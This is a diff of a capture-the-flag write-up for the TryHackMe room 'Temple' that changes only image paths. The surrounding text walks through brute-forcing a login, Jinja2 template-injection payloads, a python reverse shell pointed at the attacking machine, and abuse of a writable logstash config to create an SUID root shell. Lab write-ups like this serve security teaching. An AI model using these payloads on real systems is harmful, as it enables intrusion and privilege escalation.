@@ -56,23 +56,23 @@ The echo service is only used for testing network connectivity, but is usually d
 
 There is actually a [CVE](https://nvd.nist.gov/vuln/detail/CVE-1999-0635) stating that this service should be deprecated due to security reasons. 
 
-![](../assets/img/2026-02-07-Temple/1.png)
+![](/assets/img/2026-02-07-Temple/1.png)
 
 Moving on to FTP, it seems like anonymous logins have been disabled meaning we can't really do anything here without credentials to sign in or a username to brute force. Same goes for SSH, and both of these versions gathered from Nmap's default scripts are not vulnerable to anything too crazy.
 
-![](../assets/img/2026-02-07-Temple/2.png)
+![](/assets/img/2026-02-07-Temple/2.png)
 
 Telnet can be used to connect to ports similar to tools like Netcat. This could be turned on for things like troubleshooting or interacting with legacy hardware, but is kind of rare to see now as SSH is the more favored option for its security. Once again, we'll need creds to authenticate here.
 
-![](../assets/img/2026-02-07-Temple/3.png)
+![](/assets/img/2026-02-07-Temple/3.png)
 
 Checking out the landing page on port 80 shows the boilerplate Apache template for all new servers. There's nothing on robots.txt so I'll just leave a Gobuster scan running in the background to find potential subdirectories.
 
-![](../assets/img/2026-02-07-Temple/4.png)
+![](/assets/img/2026-02-07-Temple/4.png)
 
 Lastly, the webpage on port 61337 prompts us to login to a custom application. I try a few default credentials such as `admin:admin` or `admin:password`, but only get a standard Error.
 
-![](../assets/img/2026-02-07-Temple/5.png)
+![](/assets/img/2026-02-07-Temple/5.png)
 
 I fire up a few Gobuster scans to find subdirectories/subdomains and start testing the login for bypass vulnerabilities and injection payloads. Supplying most special characters like `#, ', ;, or |` throw an error detecting a hacking attempt.
 
@@ -89,7 +89,7 @@ hydra -L users.txt -P /opt/SecLists/rockyou.txt MACHINE_IP http-post-form "/logi
 ## Account Register API
 Looking through the directory bust results shows a lot of places that we can't access until we get a valid login. Most of them seem like APIs for site functionality, but `/application` and `/temporary` threw a 403 Forbidden Error which made me think these are directories we're just not able to view.
 
-![](../assets/img/2026-02-07-Temple/6.png)
+![](/assets/img/2026-02-07-Temple/6.png)
 
 I had trouble getting Dirsearch and Gobuster to scan recursively, so I switch to ffuf in order to rescan the site targeting those locations. I'm hoping to find any directories with secrets or APIs to use. I end up finding the /dev subdirectory inside `/temporary` which also returns with 403.
 
@@ -152,17 +152,17 @@ newacc                  [Status: 200, Size: 1886, Words: 255, Lines: 97, Duratio
 
 Checking out this page shows a forgotten account register page that the site developers probably used for testing the application. First I'll make a new account to test if this actually works or is just leftover HTML.
 
-![](../assets/img/2026-02-07-Temple/7.png)
+![](/assets/img/2026-02-07-Temple/7.png)
 
 It's a success! Logging in with our new account displays a few new tabs to check out which discloses the organization's email structure. This is cool and all but there really aren't any functions to exploit included internally.
 
-![](../assets/img/2026-02-07-Temple/8.png)
+![](/assets/img/2026-02-07-Temple/8.png)
 
 I was curious how the app kept track of our logins so I checked the cookies assigned. The first is an `identifier`, which is a SHA224 hash of our username. The second is a Flask cookie that retained the `logged_in` and `username` fields. We won't be able to impersonate anyone unless we find the signing secret so this is out of the question.
 
 _Note: I used the [flask-unsign](https://github.com/Paradoxis/Flask-Unsign) tool to decode that cookie._
 
-![](../assets/img/2026-02-07-Temple/9.png)
+![](/assets/img/2026-02-07-Temple/9.png)
 
 Thinking back to the initial directory scan, I saw that there was an `/admin` page, navigating to it still returns a 403 code. I attempted to create a new account with admin as the username to try to overwrite the previous one, but this was unsuccessful.
 
@@ -171,7 +171,7 @@ So excluding any future directory enumeration, now that I almost know the site's
 
 The second thing I can think of is trying for server-side template injection payloads as our username and hope that it doesn't filter any special characters during the registration process. This could work since the site displays our account name upon login
 
-![](../assets/img/2026-02-07-Temple/10.png)
+![](/assets/img/2026-02-07-Temple/10.png)
 
 To do this, I make a new account using a polyglot to test if the application code sanitizes our input. [This article](https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti) is a great reference if you're new to exploiting this type of vulnerability.
 
@@ -183,7 +183,7 @@ ${{<%[%'"}}%\.
 
 The polyglot payload will essentially fuzz for different templating engines by forcing an error message which can be used in order to fingerprint what is being utilized. This doesn't end up working because the single quote characters get filtered and throw a hacking detection error.
 
-![](../assets/img/2026-02-07-Temple/11.png)
+![](/assets/img/2026-02-07-Temple/11.png)
 
 I retry with a simpler payload for the Jinja2 engine that doesn't have bad characters. If successful, this will resolve to 49 and confirm that we can inject malicious usernames to be dynamically loaded in the HTML. 
 
@@ -193,7 +193,7 @@ I retry with a simpler payload for the Jinja2 engine that doesn't have bad chara
 ```
 {% endraw %}
 
-![](../assets/img/2026-02-07-Temple/12.png)
+![](/assets/img/2026-02-07-Temple/12.png)
 
 ## Initial Foothold
 Awesome, that works well. Next I'll use a fairly safe payload which will hopefully bypass any filters in place by hex encoding certain blocked characters that WAFs usually detect. [This great article](https://hackmd.io/@Chivato/HyWsJ31dI) goes very in-depth on exploiting Jinja2, including an array of payloads.
@@ -208,7 +208,7 @@ _Note: The original payload has single quotes wrapped around the parameters to e
 
 After logging in, we can see that the id command is executed confirming we have RCE on the system via SSTI. Since this application is on a non-standard port and isn't using something like Apache, the server is being ran by Bill's account. This is nice because once we grab a shell, there's no need to enumerate the system as `www-data` or another service account.
 
-![](../assets/img/2026-02-07-Temple/13.png)
+![](/assets/img/2026-02-07-Temple/13.png)
 
 Next step is to replace the id command with a reverse shell pointed towards our attacking machine. Typically I'd go with a Netcat mkfifo one liner, but that will get blocked so we need something much simpler. I tried a simple Netcat command that executes `/bin/bash` via the `-e` flag, which executes commands once a connection is established.
 
@@ -240,14 +240,14 @@ export RHOST="MACHINE_IP";export RPORT=PORT;python3 -c 'import sys,socket,os,pty
 
 All we need to do is setup a Netcat listener and host the python shell with an HTTP server before navigating to the account page to proc it. Now that we have a working shell on the box, I upgrade it using the typical `python3 import pty` method and start internal enumeration to escalate privileges.
 
-![](../assets/img/2026-02-07-Temple/14.png)
+![](/assets/img/2026-02-07-Temple/14.png)
 
 ## Privilege Escalation
 I check the `/home` directory and see two other users on the box named frankie and princess, however their accounts didn't seem to own any files other than `.bashrc` and `.profile`. Going about the usual routes of checking SUID bits set on binaries, backups with loose permissions, and crontabs yielded no results.
 
 Displaying the webapp's code shows MariaDB credentials for `temple_user` on the system which we can use to dump the database. This gives us a hash for the admin user but it doesn't end up cracking.
 
-![](../assets/img/2026-02-07-Temple/15.png)
+![](/assets/img/2026-02-07-Temple/15.png)
 
 I notice that Bill is apart of the adm group which allows us to view `/var/log`. I spend some time grepping through the auth and error logs but don't find slip ups containing passwords or anything interesting.
 
@@ -255,7 +255,7 @@ I resort to uploading [LinPEAS](https://github.com/peass-ng/PEASS-ng/releases) t
 
 If you didn't know, logstash is an open-source, server-side data processing pipeline that ingests, transforms, and ships data from their sources to a specified destination. In other words, it acts as a separate centralized logging engine to handles heaps of data from different applications. I'm banking on the fact that those logs will include secrets like credentials that may have been reused for root user on the box.
 
-![](../assets/img/2026-02-07-Temple/16.png)
+![](/assets/img/2026-02-07-Temple/16.png)
 
 I take to Google to find out how to exploit this and come across [this Hacktricks article](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/logstash.html#logstash-privilege-escalation). It explains that in order to use this service to escalate privileges, a few conditions need to be met first:
 - We either need access to write to a pipeline configuration file (under /etc/logstash/conf.d/) or if the pipeline is set with a wildcard, the ability to write to the target file.
@@ -263,11 +263,11 @@ I take to Google to find out how to exploit this and come across [this Hacktrick
 
 Checking those two things, I'm unable to write files directly to the `/conf.d/` directory. However, I see that we do indeed have write access to a sample config file inside of it.
 
-![](../assets/img/2026-02-07-Temple/17.png)
+![](/assets/img/2026-02-07-Temple/17.png)
 
 We don't have the direct ability to restart the service on our own, but checking the pipeline's YAML file (at `/etc/logstash/pipelines.yml`) for config settings shows that the automatic reload feature is enabled and set to go off every three seconds.
 
-![](../assets/img/2026-02-07-Temple/18.png)
+![](/assets/img/2026-02-07-Temple/18.png)
 
 This service will effectively let us schedule commands to be executed by root user whenever we want by altering the `logstash-sample.conf` file. As a test run, I'll use a simple `whoami` command to confirm we're able to do so.
 
@@ -289,7 +289,7 @@ output {
 
 That prints the results to output.log under the `/tmp` directory. Checking to see if it worked shows that the message contains our expected string.
 
-![](../assets/img/2026-02-07-Temple/19.png)
+![](/assets/img/2026-02-07-Temple/19.png)
 
 All that's left is to supply a malicious command to escalate privileges. You can do a reverse shell or really anything here, but I clone bash to temp and use the `chmod` binary to give it an SUID bit.
 
@@ -311,7 +311,7 @@ output {
 
 Finally, I use the binary to spawn a root shell and claim the final flag under the `/root` dir.
 
-![](../assets/img/2026-02-07-Temple/20.png)
+![](/assets/img/2026-02-07-Temple/20.png)
 
 That's all y'all, this box was super cool as it's the first time I've used log configuration files to schedule commands for privilege escalation. Big thanks to [toxicat0r](https://tryhackme.com/p/toxicat0r) for making another great challenge, I recommend taking a look at other rooms created by him.
 
